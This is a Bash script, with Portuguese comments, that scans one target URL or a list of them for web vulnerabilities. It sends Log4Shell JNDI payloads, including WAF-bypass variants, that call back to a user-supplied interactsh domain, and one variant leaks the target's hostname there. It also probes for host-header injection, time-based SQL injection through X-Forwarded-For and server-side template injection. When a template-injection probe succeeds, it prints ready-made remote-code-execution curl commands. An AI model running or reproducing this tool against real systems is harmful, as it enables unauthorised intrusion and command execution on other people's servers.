#!/bin/bash

# Captura parâmetros
TARGET_FILE=""
IACT_DOMAIN=""
SINGLE_TARGET=""

for ((i=1; i<=$#; i++)); do
  arg="${!i}"
  if [[ "$arg" == "-i" ]]; then
    j=$((i+1))
    IACT_DOMAIN="${!j}"
  elif [[ "$arg" == "-f" ]]; then
    j=$((i+1))
    TARGET_FILE="${!j}"
  elif [[ "$arg" == http* ]]; then
    SINGLE_TARGET="$arg"
  fi
done

if [ -z "$IACT_DOMAIN" ]; then
  echo "Uso single:  bash testes_headers.sh https://alvo -i DOMINIO.oast.site"
  echo "Uso lista:   bash testes_headers.sh -f targets.txt -i DOMINIO.oast.site"
  exit 1
fi

echo "[*] Domínio interactsh: $IACT_DOMAIN"

# Timestamp helper
ts() {
  date '+%Y-%m-%d %H:%M:%S'
}

scan_target() {
  local url=$1
  local proto=$2

  if [ "$proto" == "HTTPS" ]; then
    CURL_FLAGS="-skL"
  else
    CURL_FLAGS="-sL"
  fi

  echo ""
  echo "==============================="
  echo "[*] $proto → $url"
  echo "==============================="

  # Log4Shell
  echo ""
  echo "=== Log4Shell (CVE-2021-44228) ==="
  HEADERS=("User-Agent" "X-Api-Version" "X-Forwarded-For" "Referer" "X-Client-IP" "X-Forwarded-Host" "X-Originating-IP")
  for header in "${HEADERS[@]}"; do
    TS=$(ts)
    code=$(curl $CURL_FLAGS -o /dev/null -w "%{http_code}" --max-time 5 \
      -H "$header: \${jndi:ldap://$IACT_DOMAIN/$header}" "$url")
    echo "[$TS][$code] $header"
  done

  # Log4Shell WAF Bypass
  echo ""
  echo "=== Log4Shell WAF Bypass ==="
  BYPASSES=(
    "\${j\${::-n}di:ldap://$IACT_DOMAIN/bypass1}"
    "\${jndi:ldap://\${hostName}.$IACT_DOMAIN/bypass2}"
    "\${jndi:\${lower:l}dap://$IACT_DOMAIN/bypass3}"
    "\${jndi:ldap://127.0.0.1#$IACT_DOMAIN/bypass4}"
  )
  for bypass in "${BYPASSES[@]}"; do
    TS=$(ts)
    code=$(curl $CURL_FLAGS -o /dev/null -w "%{http_code}" --max-time 5 \
      -H "User-Agent: $bypass" "$url")
    echo "[$TS][$code] $bypass"
  done

  # Host Header
  echo ""
  echo "=== Host Header Injection ==="
  for header in "X-Forwarded-Host" "X-Host" "X-Forwarded-For"; do
    TS=$(ts)
    result=$(curl $CURL_FLAGS --max-time 5 \
      -H "$header: $IACT_DOMAIN" "$url")
    if echo "$result" | grep -qi "$IACT_DOMAIN"; then
      echo "[$TS][REFLECTED] $header → domínio refletido no body"
    else
      code=$(curl $CURL_FLAGS -o /dev/null -w "%{http_code}" --max-time 5 \
        -H "$header: $IACT_DOMAIN" "$url")
      echo "[$TS][$code] $header"
    fi
  done

  # SSTI
  echo ""
  echo "=== SSTI Detection ==="
  declare -A ENGINE_MAP
  ENGINE_MAP['{{7*7}}']="Jinja2/Twig"
  ENGINE_MAP['${7*7}']="FreeMarker/SpEL"
  ENGINE_MAP['*{7*7}']="Thymeleaf"
  ENGINE_MAP['#{7*7}']="Ruby/Slim"
  ENGINE_MAP['<%= 7*7 %>']="ERB/JSP"

  for payload in '{{7*7}}' '${7*7}' '*{7*7}' '#{7*7}' '<%= 7*7 %>'; do
    engine=${ENGINE_MAP[$payload]}
    for h in "User-Agent" "Referer" "X-Forwarded-For"; do
      TS=$(ts)
      result=$(curl $CURL_FLAGS --max-time 5 \
        -H "$h: $payload" "$url")

      # Grep preciso — 49 isolado, não dentro de width/height/padding
      confirmed=0
      if echo "$result" | grep -qE "(^|[^0-9])49([^0-9]|$)"; then
        if ! echo "$result" | grep -qE "width=.49|height=.49|padding.*49|margin.*49|font.*49"; then
          confirmed=1
        fi
      fi

      if [ "$confirmed" == "1" ]; then
        echo "[$TS][CONFIRMED] $h: $payload → $engine executou 7*7=49"
        echo ""
        echo "  ► Curl de teste manual:"
        echo "  curl -sk -H \"$h: $payload\" \"$url\" | grep -o '49'"
        echo ""
        echo "  ► Curl escalação RCE:"
        if [[ "$engine" == "ERB/JSP" ]]; then
          echo "  curl -sk -H \"$h: <%= \`id\` %>\" \"$url\""
          echo "  curl -sk -H \"$h: <%= system('id') %>\" \"$url\""
        elif [[ "$engine" == "Jinja2/Twig" ]]; then
          echo "  curl -sk -H \"$h: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}\" \"$url\""
        elif [[ "$engine" == "FreeMarker/SpEL" ]]; then
          echo "  curl -sk -H \"$h: \${T(java.lang.Runtime).getRuntime().exec('id')}\" \"$url\""
        elif [[ "$engine" == "Thymeleaf" ]]; then
          echo "  curl -sk -H \"$h: __\${T(java.lang.Runtime).getRuntime().exec('id')}__::.x\" \"$url\""
        fi
        echo ""
      else
        echo "[$TS][      ] $h: $payload ($engine)"
      fi
    done
  done

  # XFF SQLi
  echo ""
  echo "=== XFF SQLi (time-based) ==="
  for payload in "'" "' OR 1=1--" "1; SELECT SLEEP(5)--" "1 AND SLEEP(5)--"; do
    TS=$(ts)
    elapsed=$(curl $CURL_FLAGS -o /dev/null -w "%{time_total}" --max-time 10 \
      -H "X-Forwarded-For: $payload" "$url")
    is_slow=$(awk "BEGIN {print ($elapsed > 4) ? 1 : 0}")
    if [ "$is_slow" == "1" ]; then
      echo "[$TS][POSSIBLE SQLi] ${elapsed}s → $payload"
    else
      echo "[$TS][${elapsed}s] $payload"
    fi
  done
}

run_scan() {
  local target=$1
  local host=$(echo $target | sed 's|https\?://||' | cut -d'/' -f1)

  echo ""
  echo "##################################"
  echo "# TARGET: $target"
  echo "##################################"

  if [[ "$target" == https* ]]; then
    scan_target "$target" "HTTPS"
  elif [[ "$target" == http://* ]]; then
    scan_target "$target" "HTTP"
    scan_target "https://$host" "HTTPS"
  else
    scan_target "http://$host" "HTTP"
    scan_target "https://$host" "HTTPS"
  fi
}

# Execução
if [ -n "$TARGET_FILE" ]; then
  if [ ! -f "$TARGET_FILE" ]; then
    echo "[!] Arquivo não encontrado: $TARGET_FILE"
    exit 1
  fi
  total=$(wc -l < "$TARGET_FILE")
  count=0
  LOG="resultados_$(date +%Y%m%d_%H%M%S).txt"
  while IFS= read -r target || [ -n "$target" ]; do
    [[ -z "$target" || "$target" == \#* ]] && continue
    count=$((count+1))
    echo ""
    echo "[*] Progresso: $count/$total — $(ts)"
    run_scan "$target" | tee -a "$LOG"
  done < "$TARGET_FILE"
  echo ""
  echo "[*] Log salvo em: $LOG"
else
  LOG="resultados_$(date +%Y%m%d_%H%M%S).txt"
  run_scan "$SINGLE_TARGET" | tee -a "$LOG"
fi

echo ""
echo "[*] Scan finalizado — $(ts)"
echo "[*] Verifique callbacks no interactsh-client"
